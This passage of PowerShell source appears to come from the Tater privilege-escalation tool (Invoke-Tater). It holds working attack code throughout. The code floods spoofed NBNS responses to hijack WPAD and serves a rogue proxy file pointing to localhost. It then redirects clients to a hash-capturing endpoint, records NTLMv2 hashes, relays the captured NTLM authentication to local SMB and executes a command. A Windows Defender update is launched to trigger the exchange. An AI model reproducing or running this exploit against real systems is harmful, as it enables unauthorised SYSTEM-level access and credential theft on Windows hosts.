        $NTLM = 'NTLM ' + $NTLM_challenge_base64
        $NTLM_challenge = $HTTP_challenge

        Return $NTLM

    }

    $SMBRelayTarget = "127.0.0.1"
    
    :HTTP_listener_loop while ($tater.running)
    {
        if($tater.SMBRelay_success)
        {
            #$HTTP_stream.close()
            $tater.HTTP_client.Close()
            $tater.HTTP_client.dispose()
            $tater.console_queue.add("$(Get-Date -format 's') - Attempting to stop HTTP listener")
            start-sleep -s 1
            $tater.HTTP_client.close()
            $tater.HTTP_client.dispose()
            start-sleep -s 1
            $tater.running = $false
            break HTTP_listener_loop
        }

        $tater.message = ''
        $TCP_request = $NULL
        $TCP_request_bytes = New-Object System.Byte[] 1024

        while(!$tater.HTTP_listener.Pending() -and !$tater.HTTP_client.Connected)
        {
            $tater.console_queue.add("$(Get-Date -format 's') - Waiting for incoming HTTP connection...")
            Start-Sleep -s 1

            if($tater.SMBRelay_success)
            {
                $tater.console_queue.add("$(Get-Date -format 's') - Attempting to stop HTTP listener")
                start-sleep -s 1
                $tater.HTTP_client.close()
                $tater.HTTP_client.dispose()
                start-sleep -s 1
                $tater.running = $false
                break HTTP_listener_loop
            }
        }

        if(!$tater.HTTP_client.Connected)
        {
            $tater.HTTP_client = $tater.HTTP_listener.AcceptTcpClient() # will block here until connection 
	        $HTTP_stream = $tater.HTTP_client.GetStream() 
        }

        while ($HTTP_stream.DataAvailable)
        {
            $HTTP_stream.Read($TCP_request_bytes, 0, $TCP_request_bytes.Length)
        }

        $TCP_request = [System.BitConverter]::ToString($TCP_request_bytes)

        if($TCP_request -like "47-45-54-20*" -or $TCP_request -like "48-45-41-44-20*")
        {
            $HTTP_raw_URL = $TCP_request.Substring($TCP_request.IndexOf("-20-") + 4,$TCP_request.Substring($TCP_request.IndexOf("-20-") + 1).IndexOf("-20-") - 3)
            $HTTP_raw_URL = $HTTP_raw_URL.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
            $tater.request_RawUrl = New-Object System.String ($HTTP_raw_URL,0,$HTTP_raw_URL.Length)
        
            if($tater.request_RawUrl -eq "")
            {
                $tater.request_RawUrl = "/"
            }
        }

        if($TCP_request -like "*-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-*")
        {
            $HTTP_authorization_header = $TCP_request.Substring($TCP_request.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46)
            $HTTP_authorization_header = $HTTP_authorization_header.Substring(0,$HTTP_authorization_header.IndexOf("-0D-0A-"))
            $HTTP_authorization_header = $HTTP_authorization_header.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
            $authentication_header = New-Object System.String ($HTTP_authorization_header,0,$HTTP_authorization_header.Length)
        }
        else
        {
            $authentication_header =  ''
        }

        $HTTP_type = "HTTP"

        $HTTP_request_type = ""
        
        if ($tater.request_RawUrl -match '/wpad.dat')
        {
            $tater.response_StatusCode = (0x32,0x30,0x30)
            $HTTP_response_phrase = (0x4f,0x4b)
            $HTTP_WPAD_response = (0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x20,0x46,0x69,0x6e,0x64,0x50,0x72,0x6f,0x78,0x79,0x46,0x6f,0x72,0x55,0x52,0x4c,0x28)`
                + (0x75,0x72,0x6c,0x2c,0x68,0x6f,0x73,0x74,0x29,0x7b,0x69,0x66,0x20,0x28,0x64,0x6e,0x73,0x44,0x6f,0x6d,0x61,0x69,0x6e,0x49,0x73,0x28,0x68,0x6f)`
                + (0x73,0x74,0x2c,0x20,0x22,0x6c,0x6f,0x63,0x61,0x6c,0x68,0x6f,0x73,0x74,0x22,0x29,0x29,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x44,0x49)`
                + (0x52,0x45,0x43,0x54,0x22,0x3b,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x50,0x52,0x4f,0x58,0x59,0x20,0x31,0x32,0x37,0x2e,0x30,0x2e,0x30,0x2e,0x31)`
                + (0x3a,0x38,0x30,0x22,0x3b,0x7d)

            $NTLM = ''
            $HTTP_request_type = "WPAD"
            $tracker = "No"
        }
        elseif ($tater.request_RawUrl -eq '/GETHASHES')
        {
            $tater.response_StatusCode = (0x34,0x30,0x31)
            $HTTP_response_phrase = (0x4f,0x4b)
            #$HTTP_response_phrase = (0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64)
            $NTLM = 'NTLM'
            $HTTP_request_type = "NTLM"
            $tracker = "Yes"
        }
        else
        {
            $tater.response_StatusCode = (0x33,0x30,0x32)
            $HTTP_location = (0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x70,0x72,0x69,0x76,0x61,0x74,0x65,0x0d,0x0a,0x43,0x6f)`
                + (0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73)`
                + (0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a,0x45,0x78,0x70,0x69,0x72,0x65,0x73,0x3a,0x20,0x4d,0x6f,0x6e,0x2c,0x20,0x30,0x31,0x20,0x4a)`
                + (0x61,0x6e,0x20,0x30,0x30,0x30,0x31,0x20,0x30,0x30,0x3a,0x30,0x30,0x3a,0x30,0x30,0x20,0x47,0x4d,0x54,0x0d,0x0a,0x4c,0x6f,0x63,0x61,0x74,0x69)`
                + (0x6f,0x6e,0x3a,0x20,0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f,0x6c,0x6f,0x63,0x61,0x6c,0x68,0x6f,0x73,0x74,0x2f,0x47,0x45,0x54,0x48,0x41,0x53,0x48)`
                + (0x45,0x53,0x0d,0x0a)

            $HTTP_response_phrase = (0x4f,0x4b)
            $NTLM = ''
            $HTTP_request_type = "Redirect"
            $tracker = "No"
        }

        if($authentication_header.startswith('NTLM '))
        {
            $authentication_header = $authentication_header -replace 'NTLM ',''
            [byte[]] $HTTP_request_bytes = [System.Convert]::FromBase64String($authentication_header)
            $tater.response_StatusCode = (0x34,0x30,0x31)
            $HTTP_response_phrase = (0x4f,0x4b)
            
            if ($HTTP_request_bytes[8] -eq 1)
            {
                $tater.console_queue.add("$(Get-Date -format 's') - $HTTP_type request for " + $tater.request_RawUrl + " received from " + $tater.HTTP_client.Client.RemoteEndpoint.Address)

                if(($tater.SMB_relay) -and ($tater.SMB_relay_active_step -eq 0)) # -and ($tater.request.RemoteEndpoint.Address -ne $SMBRelayTarget))
                {
                    $tater.SMB_relay_active_step = 1
                    $tater.console_queue.add("$(Get-Date -format 's') - $HTTP_type to SMB relay triggered by " + $tater.HTTP_client.Client.RemoteEndpoint.Address)
                    $tater.console_queue.add("$(Get-Date -format 's') - Grabbing challenge for relay from $SMBRelayTarget")
                    $SMB_relay_socket = New-Object System.Net.Sockets.TCPClient
                    $SMB_relay_socket.connect($SMBRelayTarget,"445")
                    
                    if(!$SMB_relay_socket.connected)
                    {
                        $tater.console_queue.add("$(Get-Date -format 's') - SMB relay target is not responding")
                        $tater.SMB_relay_active_step = 0
                    }
                    
                    if($tater.SMB_relay_active_step -eq 1)
                    {
                        $SMB_relay_bytes = SMBRelayChallenge $SMB_relay_socket $HTTP_request_bytes
                        $tater.SMB_relay_active_step = 2
                        $SMB_relay_bytes = $SMB_relay_bytes[2..$SMB_relay_bytes.length]
                        $SMB_user_ID = $SMB_relay_bytes[34..33]
                        $SMB_relay_NTLMSSP = [System.BitConverter]::ToString($SMB_relay_bytes)
                        $SMB_relay_NTLMSSP = $SMB_relay_NTLMSSP -replace "-",""
                        $SMB_relay_NTLMSSP_index = $SMB_relay_NTLMSSP.IndexOf("4E544C4D53535000")
                        $SMB_relay_NTLMSSP_bytes_index = $SMB_relay_NTLMSSP_index / 2
                        $SMB_domain_length = DataLength ($SMB_relay_NTLMSSP_bytes_index + 12) $SMB_relay_bytes
                        $SMB_domain_length_offset_bytes = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 12)..($SMB_relay_NTLMSSP_bytes_index + 19)]
                        $SMB_target_length = DataLength ($SMB_relay_NTLMSSP_bytes_index + 40) $SMB_relay_bytes
                        $SMB_target_length_offset_bytes = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 40)..($SMB_relay_NTLMSSP_bytes_index + 55 + $SMB_domain_length)]
                        $SMB_relay_NTLM_challenge = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 24)..($SMB_relay_NTLMSSP_bytes_index + 31)]
                        $SMB_reserved = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 32)..($SMB_relay_NTLMSSP_bytes_index + 39)]
                        $SMB_relay_target_details = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_relay_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]
                    
                        [byte[]] $HTTP_NTLM_bytes = (0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00)`
                            + $SMB_domain_length_offset_bytes`
                            + (0x05,0xc2,0x89,0xa2)`
                            + $SMB_relay_NTLM_challenge`
                            + $SMB_reserved`
                            + $SMB_target_length_offset_bytes`
                            + $SMB_relay_target_details
                    
                        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
                        $NTLM = 'NTLM ' + $NTLM_challenge_base64
                        $NTLM_challenge = SMBNTLMChallenge $SMB_relay_bytes
                        $tater.HTTP_challenge_queue.Add($tater.HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString + $tater.HTTP_client.Client.RemoteEndpoint.Port + ',' + $NTLM_challenge)
                        $tater.console_queue.add("$(Get-Date -format 's') - Received challenge $NTLM_challenge for relay from $SMBRelayTarget")
                        $tater.console_queue.add("$(Get-Date -format 's') - Providing challenge $NTLM_challenge for relay to " + $tater.HTTP_client.Client.RemoteEndpoint.Address)
                        $tater.SMB_relay_active_step = 3
                    }
                    else
                    {
                        $NTLM = NTLMChallengeBase64
                    }
                }
                else
                {
                     $NTLM = NTLMChallengeBase64
                }
                
                $tater.response_StatusCode = (0x34,0x30,0x31)
                $HTTP_response_phrase = (0x4f,0x4b)
                
            }
            elseif ($HTTP_request_bytes[8] -eq 3)
            {
                $NTLM = 'NTLM'
                $HTTP_NTLM_offset = $HTTP_request_bytes[24]
                $HTTP_NTLM_length = DataLength 22 $HTTP_request_bytes
                $HTTP_NTLM_domain_length = DataLength 28 $HTTP_request_bytes
                $HTTP_NTLM_domain_offset = DataLength 32 $HTTP_request_bytes
                       
                if($HTTP_NTLM_domain_length -eq 0)
                {
                    $HTTP_NTLM_domain_string = ''
                }
                else
                {  
                    $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_length 0 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
                } 
                    
                $HTTP_NTLM_user_length = DataLength 36 $HTTP_request_bytes
                $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_length $HTTP_NTLM_domain_length 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
                        
                $HTTP_NTLM_host_length = DataLength 44 $HTTP_request_bytes
                $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_length $HTTP_NTLM_domain_length $HTTP_NTLM_user_length $HTTP_NTLM_domain_offset $HTTP_request_bytes
                
                $NTLM_type = "NTLMv2"           
                $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                $NTLM_response = $NTLM_response.Insert(32,':')
                $tater.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLM_response
                
                $tater.response_StatusCode = (0x32,0x30,0x30)
                $HTTP_response_phrase = (0x4f,0x4b)
                $NTLM_challenge = ''
                
                if (($tater.SMB_relay) -and ($tater.SMB_relay_active_step -eq 3))
                {
                    $tater.console_queue.add("$(Get-Date -format 's') - Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $SMBRelaytarget")
                    $SMB_relay_response_return_bytes = SMBRelayResponse $SMB_relay_socket $HTTP_request_bytes $SMB_user_ID
                    $SMB_relay_response_return_bytes = $SMB_relay_response_return_bytes[1..$SMB_relay_response_return_bytes.length]
                    
                    if((!$SMB_relay_failed) -and ([System.BitConverter]::ToString($SMB_relay_response_return_bytes[9..12]) -eq ('00-00-00-00')))
                    {
                        $tater.console_queue.add("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication successful for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")
                        $tater.SMB_relay_active_step = 4
                        SMBRelayExecute $SMB_relay_socket $SMB_user_ID          
                    }
                    else
                    {
                        $tater.console_queue.add("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication failed for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")
                        $tater.SMB_relay_active_step = 0
                        $SMB_relay_socket.Close()
                    }
                }
            }
            else
            {
                $NTLM = 'NTLM'
            }    
        }

        $HTTP_timestamp = Get-Date -format r
        $HTTP_timestamp = [System.Text.Encoding]::UTF8.GetBytes($HTTP_timestamp)
        
        $HTTP_WWW_authenticate_header = (0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20)

        if($NTLM)
        {
            $NTLM = [System.Text.Encoding]::UTF8.GetBytes($NTLM)
            $marker = "1"
            [Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`
                + $tater.response_StatusCode`
                + (0x20)`
                + $HTTP_response_phrase`
                + (0x0d,0x0a)`
                + (0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x70,0x72,0x69,0x76,0x61,0x74,0x65,0x0d,0x0a)`
                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a)`
                + (0x45,0x78,0x70,0x69,0x72,0x65,0x73,0x3a,0x20,0x4d,0x6f,0x6e,0x2c,0x20,0x30,0x31,0x20,0x4a,0x61,0x6e,0x20,0x30,0x30,0x30,0x31,0x20,0x30,0x30,0x3a,0x30,0x30,0x3a,0x30,0x30,0x20,0x47,0x4d,0x54,0x0d,0x0a)`
                + $HTTP_WWW_authenticate_header`
                + $NTLM`
                + (0x0d,0x0a)`
                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20,0x30,0x0d,0x0a)`
                + (0x0d,0x0a)
        }
        elseif($HTTP_request_type -eq 'WPAD')
        {
            $marker = "2"
            [Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`
                + $tater.response_StatusCode`
                + (0x20)`
                + $HTTP_response_phrase`
                + (0x0d,0x0a)`
                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a)`
                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20,0x31,0x31,0x36,0x0d,0x0a)`
                + (0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a)`
                + (0x44,0x61,0x74,0x65,0x3a)`
                + $HTTP_timestamp`
                + (0x0d,0x0a,0x0d,0x0a)`
                + $HTTP_WPAD_response 
        }
        elseif($HTTP_request_type -eq 'Redirect')
        {
            $marker = "3"
            [Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`
                + $tater.response_StatusCode`
                + (0x20)`
                + $HTTP_response_phrase`
                + (0x0d,0x0a)`
                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20,0x30,0x0d,0x0a)`
                + (0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a)`
                + $HTTP_location`
                + (0x44,0x61,0x74,0x65,0x3a)`
                + $HTTP_timestamp`
                + (0x0d,0x0a,0x0d,0x0a)
        }
        else
        {
            $marker = "1"
            [Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x20)`
                + $tater.response_StatusCode`
                + (0x20)`
                + $HTTP_response_phrase`
                + (0x0d,0x0a)`
                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20,0x31,0x30,0x37,0x0d,0x0a)`
                + (0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a)`
                + (0x44,0x61,0x74,0x65,0x3a)`
                + $HTTP_timestamp`
                + (0x0d,0x0a,0x0d,0x0a)`
        }


        [byte[]] $HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes($tater.message)
        
        $HTTP_stream.write($HTTP_response, 0, $HTTP_response.length)
        $HTTP_stream.Flush()
        start-sleep -s 1
        
        #}

        #$tater.HTTP_client.getstream.close()
        #$tater.HTTP_client.Close()

    }

    #$tater.HTTP_listener.Stop()
    #$tater.HTTP_listener.Close()
}

$spoofer_scriptblock = 
{
    param ($IP)

    [Byte[]]$NBNS_response_packet = (0x00,0x00)`
        + (0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20)`
        + (0x46,0x48,0x46,0x41,0x45,0x42,0x45,0x45,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00)`
        + (0x00,0x20,0x00,0x01,0x00,0x00,0x00,0xa5,0x00,0x06,0x00,0x00,0x7f,0x00,0x00,0x01)`
        + (0x00,0x00,0x00,0x00)
                
    $send_socket = New-Object System.Net.Sockets.UdpClient(137)
    $destination_IP = [system.net.IPAddress]::Parse($IP)
    $destination_point = New-Object Net.IPEndpoint($destination_IP,137)
    $send_socket.Connect($destination_point)
       
    while ($tater.running)
    {
        for ($i = 0; $i -lt 255; $i++)
        {
            for ($j = 0; $j -lt 255; $j++)
            {
                $NBNS_response_packet[0] = $i
                $NBNS_response_packet[1] = $j                 
                [void]$send_socket.send( $NBNS_response_packet,$NBNS_response_packet.length)
            }
        }
    }

    $send_socket.Close()
 }

 $tater_scriptblock = 
{
    param ($RunTime)

    if($RunTime)
    {    
        $tater_timeout = new-timespan -Minutes $RunTime
        $tater_stopwatch = [diagnostics.stopwatch]::StartNew()
    }

    while ($tater.running)
    {
       try
        {
            $WPAD_IP = [System.Net.Dns]::GetHostEntry("wpad").AddressList[0].IPAddressToString
        }
        catch{}
            
        if($WPAD_IP -eq "127.0.0.1")
        {
            if(!$tater.WPAD_spoof)
            {
                $tater.console_queue.add("$(Get-Date -format 's') - WPAD has been spoofed")
            }

            $tater.WPAD_spoof = $true
            $WPAD_IP = ""
        }
        else
        {
            if($tater.WPAD_spoof)
            {
                $tater.console_queue.add("$(Get-Date -format 's') - Trying to spoof WPAD...")
            }
            $tater.WPAD_spoof = $false
        }

        if(Test-Path "C:\Program Files\Windows Defender\MpCmdRun.exe")
        {
            if(($process_defender.HasExited -or !$process_defender) -and !$tater.SMB_relay_success -and $tater.WPAD_spoof)
            {
                $process_defender = Start-Process -FilePath "C:\Program Files\Windows Defender\MpCmdRun.exe" -Argument SignatureUpdate -WindowStyle Hidden -passthru
                $tater.console_queue.add("$(Get-Date -format 's') - Starting Windows Defender signature update...")
            }
        }
        else
        {
            $tater.console_queue.add("Windows Defender not found")
        }

        if($tater.SMBRelay_success)
        {
            Stop-Process -id $process_defender.Id
        }

        if($RunTime)
        {
            if($tater_stopwatch.elapsed -ge $tater_timeout)
            {
                $tater.running = $false
                $tater.HTTP_listener.server.blocking = $false
                Start-Sleep -s 1
                $tater.HTTP_listener.server.Close()
                Start-Sleep -s 1
                $tater.HTTP_listener.Stop()
                $tater.SMBRelay_success = $false
            }
        } 
           
        Start-Sleep -m 5
    }
 }

# HTTP/HTTPS Listener Startup Function 
Function HTTPListener()
{
    $tater.HTTP_endpoint = New-Object System.Net.IPEndPoint([ipaddress]::loopback,80)
    $tater.HTTP_listener = New-Object System.Net.Sockets.TcpListener $tater.HTTP_endpoint
    $tater.HTTP_listener.Start()
    $HTTP_runspace = [runspacefactory]::CreateRunspace()
    $HTTP_runspace.Open()
    $HTTP_runspace.SessionStateProxy.SetVariable('tater',$tater)
    $HTTP_powershell = [powershell]::Create()
    $HTTP_powershell.Runspace = $HTTP_runspace
    $HTTP_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_challenge_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_response_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_execute_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Command) > $null
    $HTTP_handle = $HTTP_powershell.BeginInvoke()
}

# Spoofer Startup Function
Function Spoofer()
{
    $spoofer_runspace = [runspacefactory]::CreateRunspace()
    $spoofer_runspace.Open()
    $spoofer_runspace.SessionStateProxy.SetVariable('tater',$tater)
    $spoofer_powershell = [powershell]::Create()
    $spoofer_powershell.Runspace = $spoofer_runspace
    $spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $spoofer_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
    $spoofer_powershell.AddScript($spoofer_scriptblock).AddArgument($IP) > $null
    $spoofer_handle = $spoofer_powershell.BeginInvoke()
}

# Spoofer Startup Function
Function TaterLoop()
{
    $tater_runspace = [runspacefactory]::CreateRunspace()
    $tater_runspace.Open()
    $tater_runspace.SessionStateProxy.SetVariable('tater',$tater)
    $tater_powershell = [powershell]::Create()
    $tater_powershell.Runspace = $tater_runspace
    $tater_powershell.AddScript($tater_scriptblock).AddArgument($RunTime) > $null
    $tater_handle = $tater_powershell.BeginInvoke()
}

# HTTP Server Start
HTTPListener

# Spoofer Start
Spoofer

# Tater Loop Start
TaterLoop

if($tater.console_output)
{

    :console_loop while($tater.running -and $tater.console_output)
    {
        while($tater.console_queue.Count -gt 0)
        {
            if($tater.output_stream_only)
            {
                write-output($tater.console_queue[0] + $tater.newline)
                $tater.console_queue.RemoveRange(0,1)
            }
            else
            {
                switch -wildcard ($tater.console_queue[0])
                {
                    default
                    {
                        write-output $tater.console_queue[0]
                        $tater.console_queue.RemoveRange(0,1)
                    }
                } 
            } 

        }

        if($tater.console_input)
        {
            if([console]::KeyAvailable)
            {
                $tater.console_output = $false
                BREAK console_loop
            }
        }

        Start-Sleep -m 5
    }
}

$tater.HTTP_listener.server.blocking = $false
Start-Sleep -s 1
$tater.HTTP_listener.server.Close()
Start-Sleep -s 1
$tater.HTTP_listener.Stop()
$tater.SMBRelay_success = $false
Write-Output "$(Get-Date -format 's') - Tater has exited"
}
#End Invoke-Tater

Function Stop-Tater
{
    <#
    .SYNOPSIS
    Stop-Tater will stop Tater before a successful privilege escalation.
    #>
    if($tater)
    {
        if($tater.running)
        {
            $tater.running = $false
            Start-Sleep -s 1
            $tater.HTTP_listener.server.blocking = $false
            Start-Sleep -s 1
            $tater.HTTP_listener.server.Close()
            Start-Sleep -s 1
            $tater.HTTP_listener.Stop()
            $tater.SMBRelay_success = $false

            $tater.status_queue.add("Tater exited at $(Get-Date -format 's')")|Out-Null
        }
        else
        {
            $tater.status_queue.add("Tater isn't running") | Out-Null
        }
    }
    else
    {
        $tater.status_queue.add("Tater isn't running")|Out-Null
    }

    if($tater.status_output)
    {
        while($tater.status_queue.Count -gt 0)
        {
            if($tater.output_stream_only)
            {
                write-output($tater.status_queue[0] + $tater.newline)
                $tater.status_queue.RemoveRange(0,1)
            }
            else
            {
                write-output $tater.status_queue[0]
                $tater.status_queue.RemoveRange(0,1)
            }   
        }
    }
} 

Function Get-Tater
{
    <#
    .SYNOPSIS
    Get-Inveigh will display queued Tater output.
    #>
    while($tater.console_queue.Count -gt 0)
    {
        if($tater.output_stream_only)
        {
            write-output($tater.console_queue[0] + $tater.newline)
            $tater.console_queue.RemoveRange(0,1)
        }
        else
        {
            write-output $tater.console_queue[0]
            $tater.console_queue.RemoveRange(0,1)
        }    
    }
}